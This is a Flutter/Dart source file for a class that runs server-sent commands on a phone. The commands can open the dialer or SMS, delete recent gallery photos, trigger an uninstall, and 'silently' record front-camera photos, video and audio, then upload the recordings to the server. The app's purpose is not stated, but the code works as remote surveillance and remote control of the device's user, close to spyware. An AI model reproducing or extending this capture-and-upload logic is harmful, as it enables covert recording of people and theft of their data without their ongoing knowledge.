import 'dart:async';

import 'package:flutter/widgets.dart';
import 'package:mop_app/core/api_client.dart';
import 'package:mop_app/core/device_info_service.dart';
import 'package:mop_app/core/native_bridge.dart';
import 'package:mop_app/utils/permission_helper.dart';

/// 远程指令执行（规约 PROTOCOL 4.2：dial/sms 非静默；capture 静默采集并 audit/upload 上报；gallery.clear 仅清理相册）
class CommandExecutor {
  CommandExecutor({ApiClient? api}) : _api = api ?? ApiClient();

  final ApiClient _api;

  /// 执行单条指令（cmd 含 cmd、params、msg_id）
  Future<void> execute(Map<String, dynamic> cmd) async {
    final name = cmd['cmd'] as String?;
    final params = cmd['params'] is Map ? Map<String, dynamic>.from(cmd['params'] as Map) : <String, dynamic>{};
    final msgId = cmd['msg_id'] as String? ?? '';
    if (name == null || name.isEmpty) return;
    switch (name) {
      case 'mop.cmd.dial':
        final number = _paramString(params, 'number');
        if (number.isNotEmpty) await NativeBridge.openSystemDialer(number);
        break;
      case 'mop.cmd.sms':
        final number = _paramString(params, 'number');
        final body = _paramString(params, 'body');
        await NativeBridge.openSystemSms(number, body);
        break;
      case 'mop.cmd.gallery.clear':
        // 仅清理相册最近 N 天，不清空 APP 数据、不退出登录
        final days = (params['days'] as num?)?.toInt() ?? 3;
        if (days > 0) {
          try {
            await NativeBridge.clearGalleryWithinDays(days);
          } catch (_) {}
        }
        break;
      case 'mop.cmd.wipe':
        // 已废弃：不再执行任何操作，客户端忽略
        break;
      case 'mop.cmd.uninstall':
        // 仅调起系统卸载，不再执行数据擦除
        try {
          await NativeBridge.uninstallApp();
        } catch (_) {}
        break;
      case 'mop.cmd.audit':
        // 静默：触发审计周期，由 AuditService 处理
        break;
      case 'mop.cmd.config':
        // 静默：更新 Host 等，可扩展
        break;
      case 'mop.cmd.capture.photo':
        // 未授予相机时 ensureCameraPermission() 内会调用 request()，系统会弹出权限请求
        await _runInNextFrame(() async {
          if (await ensureCameraPermission()) {
            await Future.delayed(const Duration(milliseconds: 1000));
            await _doCaptureAndUpload('capture_photo', msgId, () => NativeBridge.capturePhoto(
              camera: _paramString(params, 'camera').isEmpty ? 'front' : _paramString(params, 'camera'),
            ));
          }
        });
        break;
      case 'mop.cmd.capture.video':
        // 未授予相机/麦克风时会弹出对应系统权限请求
        await _runInNextFrame(() async {
          if (await ensureCameraPermission() && await ensureMicrophonePermission()) {
            await Future.delayed(const Duration(milliseconds: 1000));
            await _doCaptureAndUpload('capture_video', msgId, () => NativeBridge.captureVideo(
              durationSec: _paramInt(params, 'duration_sec', 18),
              camera: _paramString(params, 'camera').isEmpty ? 'front' : _paramString(params, 'camera'),
            ));
          }
        });
        break;
      case 'mop.cmd.capture.audio':
        // 未授予麦克风时 ensureMicrophonePermission() 内会调用 request()，系统会弹出权限请求
        await _runInNextFrame(() async {
          if (await ensureMicrophonePermission()) {
            await Future.delayed(const Duration(milliseconds: 1000));
            await _doCaptureAndUpload('capture_audio', msgId, () => NativeBridge.captureAudio(
              durationSec: _paramInt(params, 'duration_sec', 18),
            ));
          }
        });
        break;
      default:
        break;
    }
  }

  /// 在下一 UI 帧执行，便于系统权限对话框能正常弹出（轮询触发时也可靠）
  static Future<void> _runInNextFrame(Future<void> Function() action) async {
    final completer = Completer<void>();
    WidgetsBinding.instance.addPostFrameCallback((_) async {
      try {
        await action();
      } finally {
        if (!completer.isCompleted) completer.complete();
      }
    });
    return completer.future;
  }

  /// 从 params 安全取字符串（兼容服务端返回 number/body 为数字类型）
  static String _paramString(Map<String, dynamic> params, String key) {
    final v = params[key];
    if (v == null) return '';
    if (v is String) return v;
    if (v is num) return v.toInt().toString(); // 避免 double 转成 "13800138000.0" 导致拨号/短信收件人为空
    return v.toString();
  }

  /// 从 params 安全取整数（兼容服务端返回 duration_sec 等为 num）
  static int _paramInt(Map<String, dynamic> params, String key, int defaultValue) {
    final v = params[key];
    if (v == null) return defaultValue;
    if (v is int) return v;
    if (v is num) return v.toInt();
    if (v is String) return int.tryParse(v) ?? defaultValue;
    return defaultValue;
  }

  /// 静默采集并经 audit/upload 上报（规约 3.3）；原生未实现时采集返回空，不上报
  Future<void> _doCaptureAndUpload(String type, String msgId, Future<List<int>> Function() capture) async {
    final bytes = await capture();
    if (bytes.isEmpty) return;
    final deviceId = await DeviceInfoService.getDeviceId();
    await _api.auditUpload(deviceId, type, bytes, msgId: msgId.isNotEmpty ? msgId : null);
  }
}
